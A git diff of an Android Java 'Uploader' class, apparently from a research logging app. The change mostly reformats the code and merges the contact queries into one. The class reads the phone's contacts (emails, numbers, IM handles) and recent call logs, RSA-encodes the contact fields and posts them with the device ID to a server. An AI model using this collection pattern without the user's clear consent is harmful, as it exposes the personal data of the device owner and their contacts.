@@ -44,13 +44,14 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.ContactsContract;
+import android.provider.ContactsContract.CommonDataKinds;
 import android.provider.Settings.Secure;
 import android.util.Log;
 
 class Uploader implements Runnable {
   private static final String UPLOAD_FAILED_STR = "upload failed";
 
-  public Uploader( LogToJsonConverter logToJsonConverter, Context context) {
+  public Uploader(LogToJsonConverter logToJsonConverter, Context context) {
     super();
     this.logToJsonConverter = logToJsonConverter;
     this.context = context;
@@ -59,58 +60,61 @@ class Uploader implements Runnable {
   private static final String CONTACTINFO_STR = "contactinfo";
 
   private static final String PHONE_NUMBER_STR = "PHONE_NUMBER";
+
   private static final String EMAILS_STR = "EMAILS";
+
   LogToJsonConverter logToJsonConverter;
+
   Context context;
 
   @Override
   public void run() {
-    if ( context == null ) {
+    if (context == null) {
       Log.d("rgai", "CONTEXT IS NULL @ EventLogger.uploadLogsAndCreateNewLogfile");
       return;
     }
 
-    if ( logToJsonConverter.getDeviceId() == null ) {
+    if (logToJsonConverter.getDeviceId() == null) {
       Log.d("rgai", "logToJsonConverter: " + logToJsonConverter.toString());
       Log.d("rgai", "context: " + context.toString()); // TODO: a context neha itt null!!!!
       logToJsonConverter.setDeviceId(Secure.getString(context.getContentResolver(), Secure.ANDROID_ID));
     }
     EventLogger.INSTANCE.lockedToUpload = true;
     try {
-      if ( uploadLogsToServer(context) ) {
+      if (uploadLogsToServer(context)) {
         EventLogger.INSTANCE.deleteLogFileAndCreateNew();
       } else {
         EventLogger.INSTANCE.writeToLogFile(UPLOAD_FAILED_STR, true);
       }
-    } catch ( Exception e ) {
+    } catch (Exception e) {
       // TODO Auto-generated catch block
       e.printStackTrace();
     }
     EventLogger.INSTANCE.saveTempBufferToLogFileAndClear();
   }
 
-  public synchronized boolean uploadLogsToServer( Context context) throws ClientProtocolException, IOException, KeyStoreException, NoSuchAlgorithmException, CertificateException, KeyManagementException, UnrecoverableKeyException, ParseException, JSONException {
+  public synchronized boolean uploadLogsToServer(Context context) throws ClientProtocolException, IOException, KeyStoreException, NoSuchAlgorithmException, CertificateException, KeyManagementException, UnrecoverableKeyException, ParseException, JSONException {
 
     List<String> logList = getLogListFromLogFile();
     String jsonEncodedLogs = logToJsonConverter.convertLogToJsonFormat(logList);
     Log.d("willrgai", jsonEncodedLogs);
-    if ( jsonEncodedLogs == null )
+    if (jsonEncodedLogs == null)
       return false;
 
     final HttpPost httpPost = new HttpPost(SERVLET_URL);
 
-    if ( !uploadLogs(jsonEncodedLogs, httpPost) )
+    if (!uploadLogs(jsonEncodedLogs, httpPost))
       return false;
 
-    if ( !uploadCallInformations(httpPost) )
+    if (!uploadCallInformations(httpPost))
       return false;
 
-    if ( !uploadContactInformations(httpPost) )
+    if (!uploadContactInformations(httpPost))
       return false;
     return true;
   }
 
-  private boolean uploadContactInformations( final HttpPost httpPost) {
+  private boolean uploadContactInformations(final HttpPost httpPost) {
     List<String> contactInformations = getContactInformations();
     String encryptedContactInformations = logToJsonConverter.convertLogToJsonFormat(contactInformations);
     StringEntity httpContactListEntity;
@@ -119,15 +123,15 @@ class Uploader implements Runnable {
       httpContactListEntity = new StringEntity(encryptedContactInformations, org.apache.http.protocol.HTTP.UTF_8);
       httpContactListEntity.setContentType("application/json");
       response = getNewHttpClient().execute(httpPost);
-    } catch ( UnsupportedEncodingException e ) {
+    } catch (UnsupportedEncodingException e) {
       // TODO Auto-generated catch block
       e.printStackTrace();
       return false;
-    } catch ( ClientProtocolException e ) {
+    } catch (ClientProtocolException e) {
       // TODO Auto-generated catch block
       e.printStackTrace();
       return false;
-    } catch ( IOException e ) {
+    } catch (IOException e) {
       // TODO Auto-generated catch block
       e.printStackTrace();
       return false;
@@ -137,87 +141,44 @@ class Uploader implements Runnable {
 
   }
 
-  @SuppressWarnings("unused")
   List<String> getContactInformations() {
+
     List<String> contactInformations = new ArrayList<String>();
-    Cursor cursor;
     String uploadTime = Long.toString(LogToJsonConverter.getCurrentTime());
-    String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
+    Cursor cursor;
+    String[] contactProjection = new String[] { "contact_id", "mimetype", "data1", "data5", "data6" };
+    String contactWhere = ContactsContract.Data.MIMETYPE + " = ? or " + ContactsContract.Data.MIMETYPE + " = ?  or " + ContactsContract.Data.MIMETYPE + " = ? ";
+    String[] contactWhereParams = new String[] { CommonDataKinds.Email.CONTENT_ITEM_TYPE, CommonDataKinds.Phone.CONTENT_ITEM_TYPE, CommonDataKinds.Im.CONTENT_ITEM_TYPE };
+    String contactSortOrder = "contact_id";
 
-    cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-    while ( cursor.moveToNext() ) {
-      String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+    cursor = context.getContentResolver().query(ContactsContract.Data.CONTENT_URI, contactProjection, contactWhere, contactWhereParams, contactSortOrder);
+    while (cursor.moveToNext()) {
+      String contactId = cursor.getString(0);
+      if (cursor.getString(1).equals(CommonDataKinds.Email.CONTENT_ITEM_TYPE)) {
+        String emailAddress = cursor.getString(2);
+        contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(EMAILS_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(emailAddress)).toString());
+      } else if (cursor.getString(1).equals(CommonDataKinds.Phone.CONTENT_ITEM_TYPE)) {
+        String phoneNumber = cursor.getString(2);
+        contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(PHONE_NUMBER_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(phoneNumber)).toString());
+      } else if (cursor.getString(1).equals(CommonDataKinds.Im.CONTENT_ITEM_TYPE)) {
+        String im = cursor.getString(2);
+        if (Integer.parseInt(cursor.getString(3)) == -1) {
+          String customP = cursor.getString(4);
+          contactInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(customP).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(im)).toString());
+        } else if (Integer.parseInt(cursor.getString(3)) == 5) {
+          // TODO: gtalk
+        }
 
-      // Get E-mails
-
-      String emailsWhere = ContactsContract.Data.CONTACT_ID + " = ? ";
-      String[] emailsWhereParams = new String[] { contactId };
-
-      Cursor emails = context.getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, emailsWhere, emailsWhereParams, null);
-      String emailAddress;
-      while ( emails.moveToNext() ) {
-        addEmailContactInfos(contactInformations, uploadTime, contactId, emails);
-      }
-      emails.close();
-
-      // Get Numbers
-
-      String numbersWhere = ContactsContract.Data.CONTACT_ID + " = ? ";
-      String[] numbersWhereParams = new String[] { contactId };
-
-      Cursor numbers = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, numbersWhere, numbersWhereParams, null);
-
-      while ( numbers.moveToNext() ) {
-        addPhoneNumberContactInfos(contactInformations, uploadTime, contactId, numbers);
       }
 
-      numbers.close();
-
-      // Get Instant Messenger.........
-      String[] imWhereParams = new String[] { contactId, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
-
-      Cursor imCur = context.getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
-      while ( imCur.moveToNext() ) {
-        addInstantMessengerContactInfos(contactInformations, uploadTime, contactId, imCur);
-      }
-      imCur.close();
     }
+
     cursor.close();
     return contactInformations;
 
   }
 
-  private void addInstantMessengerContactInfos( List<String> contentInformations, String uploadTime, String contactId, Cursor imCur) {
-    String imName = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
-    String imP = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL));
-    String imCustomP = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL));
-
-    // TODO ha a gtalk előjönne mint issue
-    if ( false ) {
-      if ( Integer.parseInt(imP) == -1 ) {
-        System.out.println("Protocol: Custom ");
-      } else if ( Integer.parseInt(imP) == 5 ) {
-        System.out.println("Protocol: Google talk");
-      }
-    }
-
-    if ( imCustomP != null ) {
-      contentInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(imCustomP).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(imName)).toString());
-    }
-  }
-
-  private void addPhoneNumberContactInfos( List<String> contentInformations, String uploadTime, String contactId, Cursor numbers) {
-    String number = numbers.getString(numbers.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-    contentInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(PHONE_NUMBER_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(number)).toString());
-  }
-
-  private void addEmailContactInfos( List<String> contentInformations, String uploadTime, String contactId, Cursor emails) {
-    String emailAddress;
-    emailAddress = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
-    contentInformations.add(new StringBuilder().append(uploadTime).append(SPACE_STR).append(CONTACTINFO_STR).append(SPACE_STR).append(contactId).append(SPACE_STR).append(EMAILS_STR).append(SPACE_STR).append(RSAENCODING.INSTANCE.encodingString(emailAddress)).toString());
-  }
-
-  private boolean uploadCallInformations( final HttpPost httpPost) throws UnsupportedEncodingException, IOException, ClientProtocolException {
+  private boolean uploadCallInformations(final HttpPost httpPost) throws UnsupportedEncodingException, IOException, ClientProtocolException {
     List<String> callInformations = getCallInformations();
 
     String encryptedContactInformations = logToJsonConverter.convertLogToJsonFormat(callInformations);
@@ -237,7 +198,7 @@ class Uploader implements Runnable {
 
     Cursor c = context.getContentResolver().query(allCalls, null, "date >" + String.valueOf(EventLogger.INSTANCE.logfileCreatedTime), null, null);
 
-    while ( c.moveToNext() ) {
+    while (c.moveToNext()) {
       StringBuilder callInformationBuilder = new StringBuilder();
       callInformationBuilder.append(String.valueOf(c.getLong(c.getColumnIndex("date"))));
       callInformationBuilder.append(SPACE_STR);
@@ -262,7 +223,7 @@ class Uploader implements Runnable {
     return callInformations;
   }
 
-  private boolean uploadLogs( String jsonEncodedLogs, final HttpPost httpPost) throws UnsupportedEncodingException, IOException, ClientProtocolException {
+  private boolean uploadLogs(String jsonEncodedLogs, final HttpPost httpPost) throws UnsupportedEncodingException, IOException, ClientProtocolException {
     final StringEntity httpEntity = new StringEntity(jsonEncodedLogs, org.apache.http.protocol.HTTP.UTF_8);
     httpEntity.setContentType("application/json");
     httpPost.setEntity(httpEntity);
@@ -271,7 +232,7 @@ class Uploader implements Runnable {
     StringBuilder sb = new StringBuilder();
     br = new BufferedReader(new InputStreamReader(reader));
     String line;
-    while ( ( line = br.readLine() ) != null ) {
+    while ((line = br.readLine()) != null) {
       sb.append(line);
     }
     Log.d("willrgai", sb.toString());
@@ -280,8 +241,8 @@ class Uploader implements Runnable {
     return isUploadSuccessFull(response);
   }
 
-  private boolean isUploadSuccessFull( HttpResponse response) {
-    if ( response.getStatusLine().getStatusCode() != 200 )
+  private boolean isUploadSuccessFull(HttpResponse response) {
+    if (response.getStatusLine().getStatusCode() != 200)
       return false;
     else
       return true;
@@ -290,13 +251,13 @@ class Uploader implements Runnable {
   private List<String> getLogListFromLogFile() throws FileNotFoundException, IOException {
     List<String> logList = new ArrayList<String>();
     BufferedReader br;
-    if ( EventLogger.INSTANCE.sdCard )
+    if (EventLogger.INSTANCE.sdCard)
       br = new BufferedReader(new FileReader(EventLogger.INSTANCE.logFilePath));
     else
       br = new BufferedReader(new InputStreamReader(context.openFileInput(EventLogger.INSTANCE.logFilePath)));
     String readedLine;
     br.readLine();
-    while ( ( readedLine = br.readLine() ) != null ) {
+    while ((readedLine = br.readLine()) != null) {
       logList.add(readedLine);
     }
     br.close();
@@ -322,12 +283,12 @@ class Uploader implements Runnable {
       ClientConnectionManager ccm = new ThreadSafeClientConnManager(params, registry);
 
       return new DefaultHttpClient(ccm, params);
-    } catch ( Exception e ) {
+    } catch (Exception e) {
       return new DefaultHttpClient();
     } finally {
       try {
         inputStream.close();
-      } catch ( IOException e ) {
+      } catch (IOException e) {
         // TODO Auto-generated catch block
         e.printStackTrace();
       }
